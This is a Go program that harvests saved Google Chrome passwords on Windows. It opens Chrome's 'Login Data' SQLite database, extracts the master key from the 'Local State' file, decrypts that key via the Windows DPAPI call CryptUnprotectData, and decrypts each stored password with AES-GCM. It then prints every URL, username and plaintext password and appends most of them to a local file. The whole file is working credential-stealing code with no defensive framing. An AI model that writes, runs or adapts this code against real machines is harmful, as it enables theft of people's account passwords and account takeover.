package main

import (
	"bufio"
	"crypto/aes"
	"crypto/cipher"
	"database/sql"
	"encoding/base64"
	"fmt"
	"io/ioutil"
	"log"
	"os"
	"syscall"
	"unsafe"

	"github.com/tidwall/gjson"

	_ "github.com/mattn/go-sqlite3"
)

const (
	queryChromiumLogin = `SELECT origin_url, username_value, password_value FROM logins`
)

type DATA_BLOB struct {
	cbData uint32
	pbData *byte
}

func NewBlob(d []byte) *DATA_BLOB {
	if len(d) == 0 {
		return &DATA_BLOB{}
	}
	return &DATA_BLOB{
		pbData: &d[0],
		cbData: uint32(len(d)),
	}
}

func (b *DATA_BLOB) ToByteArray() []byte {
	d := make([]byte, b.cbData)
	copy(d, (*[1 << 30]byte)(unsafe.Pointer(b.pbData))[:])
	return d
}

func WinDecypt(data []byte) ([]byte, error) {
	dllcrypt32 := syscall.NewLazyDLL("Crypt32.dll")
	dllkernel32 := syscall.NewLazyDLL("Kernel32.dll")
	procDecryptData := dllcrypt32.NewProc("CryptUnprotectData")
	procLocalFree := dllkernel32.NewProc("LocalFree")

	var outblob DATA_BLOB
	r, _, err := procDecryptData.Call(uintptr(unsafe.Pointer(NewBlob(data))), 0, 0, 0, 0, 0, uintptr(unsafe.Pointer(&outblob)))
	if r == 0 {
		return nil, err
	}
	defer procLocalFree.Call(uintptr(unsafe.Pointer(outblob.pbData)))
	return outblob.ToByteArray(), nil
}

func AesGCMDecrypt(crypted, key, nounce []byte) ([]byte, error) {
	block, err := aes.NewCipher(key)
	if err != nil {
		return nil, err
	}
	blockMode, _ := cipher.NewGCM(block)
	origData, err := blockMode.Open(nil, nounce, crypted, nil)
	if err != nil {
		return nil, err
	}
	return origData, nil
}

func GetMaster(key_file string) ([]byte, error) {
	res, _ := ioutil.ReadFile(key_file)
	master_key, err := base64.StdEncoding.DecodeString(gjson.Get(string(res), "os_crypt.encrypted_key").String())
	if err != nil {
		return []byte{}, err
	}
	// remove string: DPAPI
	master_key = master_key[5:]
	master_key, err = WinDecypt(master_key)
	if err != nil {
		return []byte{}, err
	}
	return master_key, nil
}

func decrypt_password(pwd, master_key []byte) ([]byte, error) {
	nounce := pwd[3:15]
	payload := pwd[15:]
	plain_pwd, err := AesGCMDecrypt(payload, master_key, nounce)
	if err != nil {
		return []byte{}, nil
	}
	return plain_pwd, nil
}

func main() {
	output, _ := os.OpenFile("test.txt", os.O_RDWR|os.O_APPEND|os.O_CREATE, 0664)
	defer output.Close()
	writer := bufio.NewWriter(output)

	file := os.Getenv("LOCALAPPDATA")
	file += "\\Google\\Chrome\\User Data\\Default\\"
	file += "Login Data"

	db, err := sql.Open("sqlite3", file)
	if err != nil {
		log.Fatal("1:", err)
	}
	defer db.Close()

	rows, err := db.Query(queryChromiumLogin)
	if err != nil {
		log.Fatal("2:", err)
	}
	defer rows.Close()
	key_file := os.Getenv("USERPROFILE") + "/AppData/Local/Google/Chrome/User Data/Local State"

	for rows.Next() {
		var origin_url, username, passwdEncrypt string
		err = rows.Scan(&origin_url, &username, &passwdEncrypt)
		if err != nil {
			log.Fatal("3:", err)
		}
		password := []byte(passwdEncrypt)
		master_key, _ := GetMaster(key_file)

		var plaintext []byte

		if master_key != nil {
			plaintext, _ = decrypt_password(password, master_key)
			fmt.Println(origin_url, username, string(plaintext))

			writer.WriteString(origin_url + " | " + username + " | " + string(plaintext))
		} else {
			plaintext, _ = WinDecypt(password)
			fmt.Println(origin_url, username, string(plaintext))
		}

	}
	err = rows.Err()
	if err != nil {
		log.Fatal("4:", err)
	}
	writer.Flush()
}
